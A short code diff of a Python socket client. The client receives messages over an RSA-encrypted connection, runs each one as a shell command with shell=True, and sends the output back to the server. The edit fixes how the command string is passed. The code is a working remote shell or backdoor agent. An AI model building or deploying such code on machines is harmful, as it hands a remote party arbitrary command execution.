@@ -43,7 +43,7 @@ class Client:
             message = self.recv()
             print(message)
             try:
-                self.send(subprocess.run([message], shell=True, capture_output=True).stdout)
+                self.send(subprocess.run(message, shell=True, capture_output=True, text=True).stdout)
             except Exception as exception:
                 self.send(str(exception))
 
@@ -65,6 +65,7 @@ class Client:
         encrypted_message = rsa.encrypt(message, self.server_key)
         self.socket.send(len(encrypted_message).to_bytes(4, "big"))
         self.socket.send(encrypted_message)
+
 
 if __name__ == "__main__":
     client = Client()
